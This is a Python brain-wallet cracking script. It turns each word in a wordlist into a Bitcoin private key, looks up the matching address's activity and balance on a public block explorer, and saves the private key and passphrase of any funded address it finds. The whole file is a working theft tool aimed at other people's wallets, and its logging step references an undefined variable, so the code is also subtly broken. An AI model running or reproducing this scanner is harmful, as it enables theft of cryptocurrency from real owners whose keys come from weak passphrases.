import codecs
import hashlib

import ecdsa
import requests
from colorama import Back , Fore , Style
from lxml import html


def xBal(address) :
    urlblock = "https://bitcoin.atomicwallet.io/address/" + address
    respone_block = requests.get(urlblock)
    byte_string = respone_block.content
    source_code = html.fromstring(byte_string)
    xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[4]/td[2]'
    treetxid = source_code.xpath(xpatch_txid)
    xVol = str(treetxid[0].text_content())
    return xVol


mylist = []

with open('words.txt' , newline = '' , encoding = 'utf-8') as f :
    for line in f :
        mylist.append(line.strip())


class xWallet :

    @staticmethod
    def generate_address_from_passphrase(passphrase) :
        private_key = str(hashlib.sha256(
                passphrase.encode('utf-8')).hexdigest())
        address = xWallet.generate_address_from_private_key(private_key)
        return private_key , address

    @staticmethod
    def generate_address_from_private_key(private_key) :
        public_key = xWallet.__private_to_public(private_key)
        address = xWallet.__public_to_address(public_key)
        return address

    @staticmethod
    def __private_to_public(private_key) :
        private_key_bytes = codecs.decode(private_key , 'hex')
        key = ecdsa.SigningKey.from_string(
                private_key_bytes , curve = ecdsa.SECP256k1).verifying_key
        key_bytes = key.to_string()
        key_hex = codecs.encode(key_bytes , 'hex')
        bitcoin_byte = b'04'
        public_key = bitcoin_byte + key_hex
        return public_key

    @staticmethod
    def __public_to_address(public_key) :
        PublicKeyByte = codecs.decode(public_key , 'hex')
        sha256_bpk = hashlib.sha256(PublicKeyByte)
        sha256_bpk_digest = sha256_bpk.digest()
        ripemd160_bpk = hashlib.new('ripemd160')
        ripemd160_bpk.update(sha256_bpk_digest)
        ripemd160_bpk_digest = ripemd160_bpk.digest()
        ripemd160_bpk_hex = codecs.encode(ripemd160_bpk_digest , 'hex')
        NetByte = b'00'
        NetBTCBytePubKey = NetByte + ripemd160_bpk_hex
        NetBTCPubKeyByte = codecs.decode(
                NetBTCBytePubKey , 'hex')
        Hash256N = hashlib.sha256(NetBTCPubKeyByte)
        Hash256N_digest = Hash256N.digest()
        sha256_2_nbpk = hashlib.sha256(Hash256N_digest)
        sha256_2_nbpk_digest = sha256_2_nbpk.digest()
        sha256_2_hex = codecs.encode(sha256_2_nbpk_digest , 'hex')
        checksum = sha256_2_hex[:8]
        addrHex = (NetBTCBytePubKey + checksum).decode('utf-8')
        wallet = xWallet.base58(addrHex)
        return wallet

    @staticmethod
    def base58(addrHex) :
        alpha = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        BaseStr58 = ''
        LanZeros = len(addrHex) - len(addrHex.lstrip('0'))
        AddrINT = int(addrHex , 16)
        while AddrINT > 0 :
            digit = AddrINT % 58
            dgChar = alpha[digit]
            BaseStr58 = dgChar + BaseStr58
            AddrINT //= 58
        ones = LanZeros // 2
        for one in range(ones) :
            BaseStr58 = '1' + BaseStr58
        return BaseStr58


z = 0
w = 0
s = 0
for i in range(0 , len(mylist)) :

    passphrase = mylist[i]
    wallet = xWallet()
    private_key , address = wallet.generate_address_from_passphrase(passphrase)
    dec = int(private_key , 16)
    txid = xBal(address)
    ifbtc = '0 BTC'
    print(Fore.YELLOW , 'SCAN:' , Fore.WHITE , str(z) , Fore.YELLOW , '  WIN:' , Fore.WHITE , str(w) , Fore.YELLOW ,
          ' WithVol:' , Fore.GREEN , str(s) ,
          Fore.LIGHTWHITE_EX ,
          str(address) , Fore.RED , 'TXiD' , Fore.MAGENTA ,
          str(txid) , Fore.BLUE , '(' , Fore.YELLOW , 'MMDRZA.CoM' , Fore.BLUE , ')' , Style.RESET_ALL)

    z += 1
    if int(txid) > 0 :
        w += 1
        urlblock = "https://bitcoin.atomicwallet.io/address/" + address
        respone_block = requests.get(urlblock)
        byte_string = respone_block.content
        source_code = html.fromstring(byte_string)
        xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[3]/td[2]'
        treetxid = source_code.xpath(xpatch_txid)
        xVol = str(treetxid[0].text_content())
        print(Back.YELLOW , Fore.BLACK , 'SCAN:' , str(z) , '  WIN:' , str(w) , ' WithVol:' , str(s) ,
              '  [+] Balance:' , str(xVol) , Style.RESET_ALL)
        print(Back.WHITE , Fore.BLACK , str(address) , '           TXiD No:' , str(txid) , Style.RESET_ALL)
        print(Back.YELLOW , Fore.BLACK , str(private_key) , Style.RESET_ALL)
        if str(xVol) != str(ifbtc) :
            s += 1
            print(Back.BLUE , Fore.WHITE , 'SCAN:' , str(z) , '  WIN:' , str(w) , ' WithVol:' , str(s) ,
                  '  [+] Balance:' , str(xVol))
            print(Back.WHITE , Fore.GREEN , str(address) , '           TXiD No:' , str(txid))
            print(Back.BLUE , Fore.WHITE , str(private_key))
            print('--------------------------------[MMDRZA.CoM]------------------------------')
            f = open('BrainWalletXWalletWinnerNow.txt' , 'a')
            f.write('\nADDRESS =' + str(address) + '   BAL= ' + str(bal))
            f.write('\nPRiVATEKEY =' + str(private_key))
            f.write('\nPasspharse = ' + str(passphrase))
            f.write('----------------------------------[ MMDRZA.CoM ]---------------------------------')
            f.close()